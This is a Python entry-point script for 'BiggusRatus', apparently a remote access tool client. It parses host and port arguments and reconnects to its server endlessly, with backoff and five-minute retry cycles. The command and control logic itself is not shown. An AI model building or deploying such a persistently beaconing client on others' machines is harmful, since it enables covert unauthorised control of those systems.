import argparse
import logging
import time

from common.constants import (
    DEFAULT_CLIENT_HOST,
    DEFAULT_PORT,
    MAX_RETRIES,
)
from common.tcp import ProtocolError
from common.crypto import CryptoError
from common.key_exchange import KeyExchangeError
from common.hmac import HmacError
from client.core import Client

logger = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    # Parse command-line arguments.
    parser = argparse.ArgumentParser(
        description="BiggusRatus Client - Remote Administration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python -m client.client                           # Connect to localhost:8443
  python -m client.client --host 192.168.1.100      # Connect to specific host
  python -m client.client --port 9443               # Connect to specific port
  python -m client.client --verbose                 # Enable debug logging
        """,
    )
    parser.add_argument(
        "--host",
        type=str,
        default=DEFAULT_CLIENT_HOST,
        help=f"Server host to connect to (default: {DEFAULT_CLIENT_HOST})",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Server port to connect to (default: {DEFAULT_PORT})",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose (debug) logging",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )
    client = Client(host=args.host, port=args.port)
    logger.info(f"Connecting to {args.host}:{args.port}...")
    try:
        while not client._shutdown:
            try:
                client.run_session()
            except (ConnectionRefusedError, ConnectionError, OSError) as exc:
                if client._shutdown:
                    break
                attempt = client._increment_retry()
                if attempt > MAX_RETRIES:
                    logger.warning(
                        f"Max retries ({MAX_RETRIES}) exceeded. Waiting 5 minutes before retry cycle..."
                    )
                    client._reset_retry_count()
                    client.disconnect()
                    try:
                        time.sleep(300)
                    except KeyboardInterrupt:
                        client.shutdown()
                        break
                    continue
                backoff = client._calculate_backoff(attempt - 1)
                logger.warning(
                    f"Connection lost or failed (attempt {attempt}/{MAX_RETRIES}): {exc}. "
                    f"Retrying in {backoff:.1f}s..."
                )
                client.disconnect()
                try:
                    time.sleep(backoff)
                except KeyboardInterrupt:
                    client.shutdown()
                    break
            except (ProtocolError, ValueError, CryptoError, KeyExchangeError, HmacError) as exc:
                if client._shutdown:
                    break
                attempt = client._increment_retry()
                if attempt > MAX_RETRIES:
                    logger.warning(
                        f"Max retries ({MAX_RETRIES}) exceeded. Waiting 5 minutes before retry cycle..."
                    )
                    client._reset_retry_count()
                    client.disconnect()
                    try:
                        time.sleep(300)
                    except KeyboardInterrupt:
                        client.shutdown()
                        break
                    continue
                backoff = client._calculate_backoff(attempt - 1)
                logger.error(
                    f"Protocol error (attempt {attempt}/{MAX_RETRIES}): {exc}. "
                    f"Retrying in {backoff:.1f}s..."
                )
                client.disconnect()
                try:
                    time.sleep(backoff)
                except KeyboardInterrupt:
                    client.shutdown()
                    break
    except KeyboardInterrupt:
        client.shutdown()
        logger.info("Client shutting down")


if __name__ == "__main__":
    main()
